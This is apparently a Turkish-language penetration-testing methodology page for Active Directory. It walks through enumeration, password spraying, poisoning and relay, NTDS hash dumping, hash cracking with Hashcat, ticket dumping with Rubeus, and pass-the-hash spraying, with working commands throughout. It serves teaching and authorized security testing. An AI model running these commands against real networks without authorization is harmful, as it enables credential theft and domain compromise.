# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içinde **domain'ler**, **kullanıcılar** ve **nesneler** oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **gruplar** ve **alt gruplar** halinde organize etmeyi sağlar ve çeşitli seviyelerde **erişim haklarını** kontrol eder.

**Active Directory** yapısı üç ana katmandan oluşur: **domain'ler**, **tree'ler** ve **forest'lar**. Bir **domain**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi nesneler koleksiyonunu kapsar. **Tree'ler**, ortak bir yapıyla bağlı domain gruplarıdır ve bir **forest**, birbirleriyle **trust ilişkileri** ile bağlanmış birden fazla tree'in koleksiyonunu temsil eder; organizasyon yapısının en üst katmanıdır. Belirli **erişim** ve **iletişim hakları** her bir seviyede atanabilir.

Active Directory içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory nesnelerine ait tüm bilgileri barındırır.
2. **Object** – Directory içindeki varlıkları ifade eder; bunun içinde **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** bulunur.
3. **Domain** – Directory nesneleri için bir konteyner görevi görür; bir **forest** içinde birden fazla domain bulunabilir ve her birinin kendi nesne koleksiyonu vardır.
4. **Tree** – Ortak bir root domain'i paylaşan domainlerin gruplandırılmasıdır.
5. **Forest** – Active Directory'deki organizasyon yapısının zirvesidir; içinde birden fazla tree bulunur ve aralarında **trust ilişkileri** vardır.

**Active Directory Domain Services (AD DS)**, ağ içinde merkezi yönetim ve iletişim için kritik hizmetleri kapsar. Bu hizmetler şunlardır:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **kullanıcılar** ile **domain'ler** arasındaki etkileşimi yönetir; **authentication** ve **search** fonksiyonlarını içerir.
2. **Certificate Services** – Güvenli **dijital sertifikaların** oluşturulmasını, dağıtımını ve yönetimini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** üzerinden directory özellikli uygulamaları destekler.
4. **Directory Federation Services** – Birden fazla web uygulaması için tek oturumda **single-sign-on** yeteneği sağlar.
5. **Rights Management** – Telif hakkı korunan materyalin yetkisiz dağıtımını ve kullanımını kontrol etmeye yardımcı olur.
6. **DNS Service** – **domain name** çözümlemesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için bakınız: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir **AD'ye saldırmayı** öğrenmek istiyorsanız, **Kerberos authentication sürecini** gerçekten iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını hâlâ bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

AD'yi keşfetmek/sömürmek için hangi komutları çalıştırabileceğinize hızlıca bakmak için [https://wadcoms.github.io/](https://wadcoms.github.io) adresine bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi eylem gerçekleştirmek için **tam nitelikli isim (FQDN)** gerektirir. Bir makineye IP adresiyle erişmeye çalışırsanız, **NTLM kullanılır ve Kerberos kullanılmaz**.

## Active Directory'de Keşif (Kimlik bilgisi/oturum yok)

Bir AD ortamına erişiminiz var ama herhangi bir kimlik bilgisi/oturum yoksa şunları yapabilirsiniz:

- **Ağı pentest et:**
- Ağı tarayın, makineleri ve açık portları bulun ve **zafiyetleri exploit etmeye** veya bu makinelerden **kimlik bilgisi çıkarmaya** çalışın (örneğin, [yazıcılar çok ilginç hedefler olabilir](ad-information-in-printers.md)).
- DNS'yi enumerate etmek, web, yazıcılar, paylaşımlar, vpn, medya vb. gibi domain içindeki önemli sunucular hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Daha fazla bilgi için genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına bakın.
- **SMB servislerinde null ve Guest erişimini kontrol et** (bu modern Windows sürümlerinde çalışmayabilir):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB sunucusunu nasıl enumerate edeceğinize dair daha detaylı bir rehber burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP'ı enumerate et**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'ı nasıl enumerate edeceğinize dair daha detaylı bir rehber burada bulunabilir (anonim erişime özellikle **dikkat edin**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı zehirle (Poison the network)**
- Hizmetleri taklit ederek kimlik bilgileri topla: [**Responder ile servisleri taklit etme**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**Relay attack'i kötüye kullanarak** host'a eriş](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- [**evil-S ile sahte UPnP servisleri açığa çıkararak** kimlik bilgileri topla](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- İç belgelerden, sosyal medyadan, domain içindeki servislerden (özellikle web) ve kamuya açık kaynaklardan kullanıcı adları/isimler çıkarın.
- Şirket çalışanlarının tam isimlerini bulursanız, farklı AD **kullanıcı adı konvansiyonlarını** deneyebilirsiniz ([**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın konvansiyonlar: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _rastgele harf ve 3 rastgele sayı_ (abc123).
- Araçlar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Kullanıcı keşfi

- **Anonim SMB/LDAP keşfi:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute keşfi**: Geçersiz bir kullanıcı adı sorgulandığında sunucu, kullanıcının geçersiz olduğunu belirlememizi sağlayan **Kerberos hata** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verecektir. **Geçerli kullanıcılar**, ya bir **TGT içeren AS-REP** yanıtı ya da kullanıcının pre-authentication yapması gerektiğini gösteren _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatası ile sonuçlanır.
- **MS-NRPC'ye karşı Kimlik Doğrulama Olmadan**: Domain controller'lar üzerindeki MS-NRPC (Netlogon) arayüzüne auth-level = 1 (Kimlik doğrulama yok) kullanarak bağlanmak. Yöntem, MS-NRPC arayüzüne bağlandıktan sonra `DsrGetDcNameEx2` fonksiyonunu çağırarak herhangi bir kimlik bilgisi olmadan kullanıcı veya bilgisayarın var olup olmadığını kontrol eder. Bu tür bir keşfi uygulayan araç [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)'dur. Araştırma şurada bulunabilir: [https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, ayrıca ona karşı **user enumeration** gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adları listelerini [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak, daha önce yapmanız gereken recon adımından şirkette çalışan kişilerin **isimlerine** sahip olmalısınız. İsim ve soyadı ile potansiyel geçerli kullanıcı adları üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Knowing one or several usernames

Tamam, geçerli bir kullanıcı adına zaten sahip olduğunuzu ama parolası olmadığını biliyorsunuz... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Bir kullanıcının _DONT_REQ_PREAUTH_ özniteliği **yoksa** o kullanıcı için şifreden türetilmiş bir anahtarla şifrelenmiş bazı veriler içerecek bir AS_REP mesajı **isteyebilirsiniz**.
- [**Password Spraying**](password-spraying.md): Keşfedilen her kullanıcı için en **yaygın parolaları** deneyin, belki bazı kullanıcılar zayıf bir parola kullanıyordur (parola politikasını unutmayın!).
- Ayrıca kullanıcıların mail sunucularına erişim sağlamak için OWA sunucularını da **spray** ederek deneyebilirsiniz.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Network'teki bazı protokolleri **poisoning** yaparak kırmak için bazı challenge **hashes** elde edebilirsiniz:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Eğer active directory'yi enumerate etmeyi başardıysanız, **daha fazla e-posta ve network hakkında daha iyi bir anlayışa** sahip olursunuz. AD ortamına erişmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayabilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- Her engagement için AD recon durumunu saklamak üzere **`nxcdb` workspaces** kullanın: `workspace create <name>` her protokol için SQLite DB'leri `~/.nxc/workspaces/<name>` altında oluşturur (smb/mssql/winrm/ldap/etc). Görünümler arasında `proto smb|mssql|winrm` ile geçiş yapın ve toplanmış gizli bilgileri `creds` ile listeleyin. İşiniz bittiğinde hassas verileri elle temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery ile **`netexec smb <cidr>`** **domain**, **OS build**, **SMB signing requirements**, ve **Null Auth** gibi bilgileri ortaya çıkarır. `(signing:False)` gösteren makineler **relay-prone** iken, DCs genellikle signing gerektirir.
- NetExec çıktısından doğrudan **hostnames in /etc/hosts** oluşturun, hedeflemeyi kolaylaştırmak için:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Eğer **SMB relay to the DC is blocked** by signing, yine de **LDAP** duruşunu kontrol edin: `netexec ldap <dc>` `(signing:None)` / weak channel binding'i işaret eder. SMB signing gerekli ama LDAP signing devre dışı olan bir DC, **SPN-less RBCD** gibi kötüye kullanımlar için hâlâ uygun bir **relay-to-LDAP** hedefi olmaya devam eder.

### İstemci tarafı yazıcı credential leaks → toplu domain credential doğrulama

- Yazıcı/web UI'ları bazen **maskelenmiş admin parolalarını HTML içine embed eder**. Kaynağı/devtools'u görüntülemek düz metin parolayı ortaya çıkarabilir (örn. `<input value="<password>">`), bu da Basic-auth erişimiyle scan/print repository'lerine erişmeye izin verir.
- Alınan print job'lar kullanıcı başına parolalar içeren **düz metin onboarding dokümanları** barındırabilir. Test yaparken eşleştirmelerin doğru olduğundan emin olun:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Kimlik Bilgilerini Çalma

Eğer **null veya guest user** ile **diğer PC'lere veya paylaşımlara erişebiliyorsanız** (ör. bir SCF file yerleştirerek) bu dosyalar bir şekilde erişildiğinde size karşı bir **NTLM authentication tetikleyebilir** ve böylece kırmak için **NTLM challenge**'ını **ele geçirebilirsiniz**:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, sahip olduğunuz her NT hash'ini, anahtar materyali doğrudan NT hash'ten türetilen daha yavaş formatlar için bir candidate password olarak kabul eder. Kerberos RC4 ticket'larında, NetNTLM challenge'larında veya cached credentials'ta uzun parola denemeleri yapmak yerine, NT hash'lerini Hashcat’in NT-candidate modlarına verip parola tekrar kullanımını doğrulatırsınız; plaintext'i öğrenmeden bunu yapabilirsiniz. Bu, özellikle domain kompromize olduktan sonra binlerce güncel ve geçmiş NT hash'i toplandıysa çok etkilidir.

Ne zaman shucking kullanmalı:

- DCSync, SAM/SECURITY dumps veya credential vault'larından bir NT korpusu varsa ve diğer domain/forest'lerde parola tekrar kullanımını test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM cevapları veya DCC/DCC2 blob'ları yakaladıysanız.
- Uzun, kırılması zor passphrase'lerin tekrar kullanımını hızlıca kanıtlayıp hemen Pass-the-Hash ile pivot yapmak istiyorsanız.

Teknik, anahtarları NT hash olmayan şifreleme tiplerine (ör. Kerberos etype 17/18 AES) karşı çalışmaz. Eğer bir domain yalnızca AES uyguluyorsa, normal parola modlarına dönmelisiniz.

#### NT hash korpusu oluşturma

- **DCSync/NTDS** – `secretsdump.py` ile history alarak mümkün olduğunca çok NT hash (ve önceki değerleri) çekin:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History girdileri candidate havuzunu dramatik şekilde genişletir çünkü Microsoft hesap başına 24 önceki hash'e kadar saklayabilir. NTDS sırlarını toplamanın diğer yolları için bakınız:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump'ları** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) yerel SAM/SECURITY verilerini ve cached domain logon'ları (DCC/DCC2) çıkarır. Bu hash'leri dedupe edip aynı `nt_candidates.txt` listesine ekleyin.
- **Meta veriyi takip et** – Her hash'i üreten username/domain'i saklayın (wordlist sadece hex içerse bile). Hashcat kazanan candidate'i yazdırdığında, eşleşen hash'in hangi principal tarafından tekrar kullanıldığını hemen anlarsınız.
- Aynı forest veya trusted forest'ten candidate'ları tercih edin; shucking sırasında çakışma şansını maksimize eder.

#### Hashcat NT-candidate modları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32-hex NT hashleri** olarak kalmalıdır. Kural motorlarını devre dışı bırakın (no `-r`, hybrid mod yok) çünkü mangling candidate anahtar materyalini bozar.
- Bu modlar doğası gereği daha hızlı değildir, ama NTLM anahtar alanı (~30,000 MH/s bir M3 Max üzerinde) Kerberos RC4'e (~300 MH/s) göre ~100× daha hızlıdır. Seçilmiş bir NT listesi test etmek, yavaş formatta tüm parola alanını keşfetmekten çok daha ucuzdur.
- Her zaman **latest Hashcat build** çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`) çünkü 31500/31600/35300/35400 modları yakın zamanda eklendi.
- Şu an AS-REQ Pre-Auth için bir NT modu yoktur ve AES etype'ları (19600/19700) plaintext parola gerektirir çünkü anahtarları UTF-16LE parolalardan PBKDF2 ile türetilir, ham NT hash'ten değil.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük ayrıcalıklı bir kullanıcıyla hedef SPN için bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'i NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat her NT candidate'tan RC4 anahtarını türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme, service account'un mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

İsterseniz daha sonra plaintext'i `hashcat -m 1000 <matched_hash> wordlists/` ile kurtarabilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Kompromize bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginç domain kullanıcı için DCC2 satırını `dcc2_highpriv.txt` içine kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listede zaten bilinen bir NT hash'i verir ve cached kullanıcının parolasını tekrar kullandığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string'i kurtarmak için hızlı NTLM modunda brute-force edebilirsiniz.

Aynı iş akışı NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendikten sonra relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'i offline olarak mask/rule ile yeniden kırabilirsiniz.



## Active Directory'yi kimlik bilgisi/oturum ile sıralama

Bu aşama için geçerli bir domain hesabının **kimlik bilgilerini veya oturumunu kompromize etmiş olmanız** gerekir. Eğer bazı geçerli kimlik bilgilerine veya bir domain kullanıcısı olarak shell'e sahipseniz, **önceki verilen seçeneklerin diğer kullanıcıları kompromize etmek için hâlâ geçerli olduğunu** unutmayın.

Authenticated enumeration'a başlamadan önce **Kerberos double hop problem**'i bilmelisiniz.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir hesabı kompromize etmek, tüm domain'i kompromize etmeye başlamak için **büyük bir adımdır**, çünkü Active Directory Enumeration'ı başlatabileceksiniz:

[**ASREPRoast**](asreproast.md) ile artık her olası vulnerable user'ı bulabilirsiniz, ve [**Password Spraying**](password-spraying.md) ile tüm username listesini elde edip kompromize hesabın parolasını, boş parolaları ve yeni umut veren parolaları deneyebilirsiniz.

- Temel recon yapmak için [**CMD** kullanabilirsiniz](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olması için [**powershell ile recon**](../basic-powershell-for-pentesters/index.html) kullanabilirsiniz
- Daha detaylı bilgi çıkarmak için [**powerview**](../basic-powershell-for-pentesters/powerview.md) kullanabilirsiniz
- Active Directory'de recon için başka müthiş bir araç [**BloodHound**](bloodhound.md). Kullanılan collection yöntemlerine bağlı olarak **çok stealthy değildir**, ama eğer bundan umursamıyorsanız denemeye değer. Kullanıcıların nerelere RDP yapabildiğini, gruplara giden yolları vb. bulun.
- **Diğer otomatik AD enumeration araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- AD'nin [**DNS kayıtları**](ad-dns-records.md) ilginç bilgiler içerebilir.
- Directory'yi enumerate etmek için GUI tabanlı bir araç **AdExplorer.exe** (SysInternal Suite).
- LDAP veritabanında _userPassword_ & _unixUserPassword_ alanlarında veya hatta _Description_ içinde credential aramak için **ldapsearch** kullanabilirsiniz. Diğer yöntemler için bkz. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Eğer **Linux** kullanıyorsanız domain'i enumerate etmek için [**pywerview**](https://github.com/the-useless-one/pywerview) da kullanabilirsiniz.
- Otomatik araçları da deneyebilirsiniz:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarmak**

Windows'ta tüm domain username'lerini almak çok kolaydır (`net user /domain`, `Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü kısa görünse bile en önemli kısımdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound) girin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve rahat olana kadar pratik yapın. Bir assessment sırasında bu, sizi DA'ya götürecek yolu bulmanın veya hiçbir şey yapılamayacağına karar vermenin ana anı olacaktır.

### Kerberoast

Kerberoasting, servislerle ilişkili kullanıcı hesapları tarafından kullanılan **TGS ticket'larını** elde etmeyi ve bunların şifreleme tabanlı (kullanıcı parolalarına dayalı) kısmını **offline** kırmayı içerir.

Detaylar için:

{{#ref}}
kerberoast.md
{{#endref}}

### Uzak bağlantı (RDP, SSH, FTP, Win-RM, vb.)

Bazı kimlik bilgileri elde ettikten sonra herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port taramalarınıza göre çeşitli protokollerle birden fazla sunucuya bağlanmayı denemek için **CrackMapExec** kullanabilirsiniz.

### Yerel Ayrıcalık Yükseltme

Eğer normal bir domain kullanıcısı olarak kimlik bilgilerini veya oturumu kompromize ettiyseniz ve bu kullanıcıyla domain içindeki **herhangi bir makineye** **erişiminiz** varsa, yerelde ayrıcalıkları yükseltip credential toplama yollarını aramalısınız. Çünkü sadece local administrator ayrıcalıklarıyla diğer kullanıcıların hash'lerini bellekte (LSASS) ve localde (SAM) dump edebilirsiniz.

Bu kitapta [**Windows'ta yerel ayrıcalık yükseltme**](../windows-local-privilege-escalation/index.html) hakkında tam bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Mevcut Oturum Ticket'ları

Mevcut kullanıcıda sizi beklenmedik kaynaklara erişime izin veren **ticket'lar** bulma olasılığı çok **düşüktür**, fakat kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Active Directory'yi enumerate etmeyi başardıysanız **daha fazla e‑posta ve ağ hakkında daha iyi bir anlayış** elde etmiş olursunuz. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Artık bazı temel credentials'a sahip olduğunuz için AD içinde paylaşılan herhangi bir **ilginç dosya** bulup bulamayacağınızı kontrol etmelisiniz. Bunu manuel yapabilirsiniz ama çok sıkıcı, tekrarlayan bir iştir (özellikle yüzlerce doküman bulursanız daha da fazla).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Eğer diğer PCs veya shares'a erişebiliyorsanız, erişildiğinde size karşı bir **NTLM authentication** tetikleyecek dosyalar (ör. bir SCF file) **place** edebilirsiniz; böylece **NTLM challenge**'ı çalıp kırabilirsiniz:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu zafiyet herhangi bir authenticated kullanıcıya **domain controller'ı compromise etme** imkanı sağlıyordu.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Aşağıdaki teknikler için sıradan bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**

### Hash extraction

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying dahil), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) kullanarak bir **local admin** hesabını **compromise** etmeyi başarmışsınızdır.\
Sonra, bellekteki ve yerel olarak tüm hash'leri dump etme zamanı.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ine sahip olduğunuzda**, onu **impersonate** etmek için kullanabilirsiniz.\
Bu, o hash'i kullanarak NTLM authentication gerçekleştirecek bir **tool** kullanmanızı gerektirir; **veya** yeni bir **sessionlogon** oluşturup o **hash**'i **LSASS** içine **inject** edebilirsiniz; böylece herhangi bir **NTLM authentication** yapıldığında o **hash** kullanılacaktır. Son seçenek mimikatz'ın yaptığıdır.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, kullanıcının **NTLM hash'ini Kerberos ticket talep etmek için kullanmayı** amaçlar; bu, NTLM üzerinden Pass The Hash'ın yaygın yöntemine bir alternatiftir. Bu nedenle, NTLM protokolünün devre dışı bırakıldığı ve yalnızca **Kerberos**'un authentication protokolü olarak izin verildiği ağlarda özellikle faydalı olabilir.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) saldırı yönteminde, saldırganlar parola veya hash değerleri yerine bir kullanıcının authentication ticket'ını **steal** eder. Çalınan bu ticket daha sonra kullanıcıyı **impersonate** etmek için kullanılır ve ağ içindeki kaynaklara ve servislere yetkisiz erişim sağlar.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Eğer bir local administrator'un **hash**'ine veya **password**'üne sahipseniz, bununla diğer **PCs**'lere **login locally** yapmayı denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'in bunu **hafifleteceğini** unutmayın.

### MSSQL İstismarı ve Güvenilen Bağlantılar

Bir kullanıcının **MSSQL instance'larına erişim** ayrıcalıkları varsa, MSSQL hostunda (SA olarak çalışıyorsa) **komut çalıştırmak**, NetNTLM **hash**ini **çalmak** veya bir **relay** **saldırısı** gerçekleştirmek için bunu kullanabilmesi mümkündür.\
Ayrıca, bir MSSQL instance'ı farklı bir MSSQL instance tarafından trusted (database link) olarak ayarlanmışsa ve kullanıcı trusted database üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer instance'ta da sorgu çalıştırabilecektir**. Bu trust'lar zincirlenebilir ve bir noktada kullanıcı komut çalıştırabileceği yanlış yapılandırılmış bir database bulabilir.\
**Veritabanları arasındaki link'ler forest trust'ları üzerinden bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platformlarının istismarı

Üçüncü taraf envanter ve deployment suite'leri genellikle kimlik bilgilerine ve kod yürütmeye güçlü yollar açar. Bakınız:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Eğer herhangi bir Computer objesinde [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute'u bulunuyorsa ve bilgisayarda domain ayrıcalıklarınız varsa, bu bilgisayara giriş yapan her kullanıcının belleğinden TGT'leri dump edebileceksiniz.\
